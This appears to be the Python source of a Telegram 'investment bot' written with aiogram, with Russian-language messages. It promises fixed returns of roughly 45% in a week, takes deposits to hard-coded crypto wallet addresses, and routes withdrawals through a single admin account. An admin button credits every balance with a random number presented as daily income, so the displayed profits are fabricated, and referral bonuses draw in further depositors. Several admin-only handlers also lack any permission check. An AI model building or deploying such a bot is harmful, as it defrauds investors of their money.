import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.client import bot
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from menu import *
from about_as import *
from capcha import generate_random_number
from config import TOKEN, ADMIN
from database import *



# CONNECT
bot = Bot(TOKEN)
dp = Dispatcher()
db = DataBase('users.db')

# CREATE DATABASE
con = sqlite3.connect('users.db')
cur = con.cursor()
cur.execute('CREATE TABLE IF NOT EXISTS referal (id INTEGER PRIMARY KEY, user_id INTEGER, referer_id INTEGER)')
cur.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, user_id INTEGER, user_name TEXT, balance INTEGER, rbalance INTEGER, income INTEGER)")
con.commit()

# GLOBALS
photo_start = 'AgACAgEAAxkBAAIQWmWZfMhUvQmOMOef0Xwqmn-uEIrdAALfrDEbY_rRRERg27ZmOrWnAQADAgADeQADNAQ'
photo_menu = 'AgACAgEAAxkBAAIQVmWZfAgojhO9PE8sTGmGh60_ajBQAALbrDEbY_rRRI6fkVizLFnEAQADAgADeQADNAQ'
photo_balance = 'AgACAgEAAxkBAAIQvmWaXdgRMUj2h7S6ilQmddZD9omZAAIerDEbYpjQROjvSFOmFZ5oAQADAgADeQADNAQ'
calc_photo = 'AgACAgEAAxkBAAIRXmWdSoqYmRmRN3WJq6071mSwQ0GMAAI4rTEb6VXpRHwNodcqk4vBAQADAgADeQADNAQ'


class IdForAdmin(StatesGroup):
    ID = State()
    AMOUNT = State()


@dp.message(CommandStart())
async def start(message: types.Message):
    if message.chat.type == 'private':
        check_id = message.text[7:]
        referer_id = str(check_id)
        con = sqlite3.connect('users.db')
        cur = con.cursor()
        cur.execute('SELECT user_id FROM referal WHERE user_id = ?', (message.from_user.id,))
        result = cur.fetchone()
        if result is None:
            db.add_data_user(message.from_user.id, message.from_user.first_name, balance=0, rbalance=0, income=0)
            cur.execute('INSERT INTO referal (user_id) VALUES (?)', (message.from_user.id,))
            con.commit()
        if referer_id and referer_id != str(message.from_user.id):
            await is_refers(message, message.from_user.id, referer_id)
            global photo_start
            await bot.send_photo(message.from_user.id, photo_start, caption=f'Приветствуем тебя {message.from_user.first_name} в нашем инвестиционном боте!\n\nЕсли ещё не подписан, то подпишись:\n\nНаш канал: \nhttps://t.me/m_m_trade\nЧат: \nhttps://t.me/moneymtrade',
                                 reply_markup=start_menu)
            await message.delete()
        else:
            await bot.send_photo(message.from_user.id, photo_start, caption=f'Приветствуем тебя {message.from_user.first_name} в нашем инвестиционном боте!\n\nЕсли ещё не подписан, то подпишись:\n\nНаш канал: \nhttps://t.me/m_m_trade\nЧат: \nhttps://t.me/moneymtrade',
                                 reply_markup=start_menu)
            await message.delete()


async def is_refers(message: types.Message, user_id, referer_id):
    con = sqlite3.connect('users.db')
    cur = con.cursor()
    cur.execute('UPDATE referal SET referer_id=? WHERE user_id=?', (referer_id, user_id))
    con.commit()
    await bot.send_message(referer_id, 'Новый реферал перешёл по твоей ссылке!')



@dp.callback_query(F.data == 'calc')
async def calc(message: types.Message):
    await bot.send_photo(message.from_user.id, photo_menu, caption= f'{message.from_user.first_name}, наши трейдеры большие молодцы, но не всё зависит от них - это же рынок.\n\nПоэтому мы берём средние диапазоны от 0,6 до 1,2 % - это точно и стабильно у нас получается.\n\nВыбери подходящий тебе вариант инвестиции ниже', reply_markup=calc_menu)

@dp.callback_query(F.data == '10_7')
async def calc(message: types.Message):
    await bot.send_photo(message.from_user.id, calc_photo, caption='Ваш доход за 7 дней составит: 14,5$ от депозита 10$', reply_markup=start_menu)

@dp.callback_query(F.data == '50_14')
async def calc(message: types.Message):
    await bot.send_photo(message.from_user.id, calc_photo, caption='Ваш доход за 14 дней составит: 74$ от депозита 50$', reply_markup=start_menu)

@dp.callback_query(F.data == '100_7')
async def calc(message: types.Message):
    await bot.send_photo(message.from_user.id, calc_photo, caption='Ваш доход за 7 дней составит: 145$ от депозита 100$', reply_markup=start_menu)

@dp.callback_query(F.data == '500_14')
async def calc(message: types.Message):
    await bot.send_photo(message.from_user.id, calc_photo, caption='Ваш доход за 14 дней составит: 1450$ от депозита 500$', reply_markup=start_menu)


@dp.callback_query(F.data == 'down_balance')
async def balance_down_handler(message: types.Message):
    await bot.send_photo(message.from_user.id, photo_menu, caption=
                           f'{message.from_user.first_name}, мы командой приняли решение, что будем индивидуально подходить к инвесторам.\n\nПоэтому для вывода или перевода денег бысрее и надёжнее будет написать администратору или в общий чат и тегнуть админа.\n\nOтправляете свой адрес кошелька, сумму и id - админ сверит баланс по id и запрос на вывод, после чего совершит перевод и отправит скрин.\n\nАдмин - @sergeyrusanof')

@dp.callback_query(F.data == 'up_balance')
async def balance_up_handler(message: types.Message):
    global photo_balance
    await bot.send_photo(message.from_user.id, photo_balance, caption=f'{message.from_user.first_name}, для внесения депозита в систему совершите перевод на один из указанных адрессов\n\n'
                         f'BTC - `bc1q870x32djd7duegg63y62n58tzn55qjtg9x8gtc`\n'
                         f'ETH - `0x26C0DA068169DEddfcb64695E9f35e313ad26618`\n'
                         f'ERC20 - `0x26C0DA068169DEddfcb64695E9f35e313ad26618`\n'
                         f'TRC20 - `TCMdGboYqP6iouauDcFxkwin2HkB3vw42s`\n'
                         f'BEP20 - `0x26C0DA068169DEddfcb64695E9f35e313ad26618`\n\n'
                         f'После оплаты отправьте скриншот и свой id админу бота. После проверки в профиле будет виден баланс.\nАдмин - @sergeyrusanof - это живой, реальный человек поэтому ответ в течении 3-х часов в рабочее время.', parse_mode='MARKDOWN')



@dp.callback_query(F.data == 'ref_system')
async def refers_handler(message: types.Message):
    con = sqlite3.connect('users.db')
    cur = con.cursor()
    cur.execute('SELECT * FROM referal WHERE referer_id=?', (message.from_user.id,))
    count = cur.fetchall()
    data = db.profile_data(message.from_user.id)
    await bot.send_photo(message.from_user.id, photo_menu, caption=f'Привет, {message.from_user.first_name}.\nТы получаешь вознаграждение - 5% от суммы пополнений твоих рефералов.\n\n'
                                                f'Перешли: {len(count)} реферала.\n\n'
                                                f'Твой доход от рефки: {data[4]} $\n\n'
                                                f'Ссылка: `https://t.me/lessons_test_test_bot?start={message.from_user.id}`', parse_mode='MARKDOWN')


@dp.callback_query(F.data == 'st_profile')
async def profile_handler(message: types.Message):
    global photo_menu
    data = db.profile_data(message.from_user.id)
    count = db.count_ref(message.from_user.id)
    await bot.send_photo(message.from_user.id, photo_menu, caption=f'Привет, {message.from_user.first_name}. Ты в своём профиле..\n'
                                                               f'<i>id {message.from_user.id}</i>\n\n'
                                                               f'<i>Баланс {round(data[3], 3)} $</i>\n\n'
                                                               f'<i>Доход за сутки: {data[5]} %</i>\n\n'
                                                               f'<i>Рефералы: {count} чел. {data[4]} $</i>\n\n'
                                                               f'<i>Доход за всё время в проекте: 0 $</i>', parse_mode='HTML', reply_markup=profil_menu)


@dp.callback_query(F.data == 'about')
async def about_handler(message: types.Message):
    await bot.send_photo(message.from_user.id, photo_menu, caption=f'{text_about_as}', reply_markup=back_menu)

@dp.callback_query(F.data == 'user_balance')
async def user_balance_id(message: types.Message, state: FSMContext):
    await bot.send_message(message.from_user.id, 'Отправь id юзера')
    await state.set_state(IdForAdmin.ID)

@dp.message(IdForAdmin.ID)
async def get_id(message: types.Message, state: FSMContext):
    await state.update_data(ID=message.text)
    db.chek_id_adm(message.text)
    await bot.send_message(message.from_user.id, f'Юзер с ID {message.text} найден!\n\nВведите сумму пополнения:', )
    await state.set_state(IdForAdmin.AMOUNT)

@dp.message(IdForAdmin.AMOUNT)
async def get_amount(message: types.Message, state: FSMContext):
    await state.update_data(AMOUNT=message.text)
    date = await state.get_data()
    user_id = date.get('ID')
    amount_up = date.get('AMOUNT')
    db.up_balance(user_id, amount_up)
    bonus = (int(amount_up)*5)/100
    referer = db.is_refer(user_id)
    if referer:
        await bot.send_message(message.from_user.id, f'Есть реферер у этого пользователя!\nЕго реферер {referer[0]} \nБаланс юзера {user_id} пополнен на {amount_up}$\nРефереру начислен бонус - {bonus}$')
        db.refs_bonus(referer[0], bonus)
        await bot.send_message(referer[0], f'Тебе начислен бонус {bonus}$\nПополнения баланса пользователя {user_id} на {amount_up}$')
    else:
        await bot.send_message(message.from_user.id, f'Нет рефереров!\nБаланс пользователя {user_id} пополнен на сумму {amount_up}$')
    await state.clear()



@dp.callback_query(F.data == 'all_users')
async def all_users_handler(message: types.Message):
    users = db.users_in_bot()
    header = f"{'ID':<4} | {'User ID':<12} | {'User Name':<10} | {'Balance':<9} | {'RBalance':<8} | {'Income':<7}"
    rows = [f"{user[0]:<4} | {user[1]:<12} | {user[2]:<10} | {round(user[3], 3):<9} | {round(user[4], 3):<8} | {round(user[5], 3):<7}" for user in users]
    message_text = f'{header}\n\n' + '\n'.join(rows)
    await bot.send_message(message.from_user.id, message_text)


@dp.message(F.photo)
async def all_photo(message: types.Message):
    id = message.photo[-1].file_id
    print(id)
    await bot.send_message(message.from_user.id, 'Спасибо!')


@dp.message(F.text == '/adm')
async def adm_handler(message: types.Message):
    if message.from_user.id == ADMIN:
        await bot.send_message(message.from_user.id, 'Привет АДМИН!', reply_markup=for_admin_menu)

@dp.callback_query(F.data == 'change_balance')
async def income_every_day(message: types.Message):
    amount = round(generate_random_number(), 3)
    db.all_balance(amount)
    db.income_day(amount)
    await bot.send_message(ADMIN, f'Баланс увеличен на {amount}')


async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)



if __name__ == '__main__':
    asyncio.run(main())
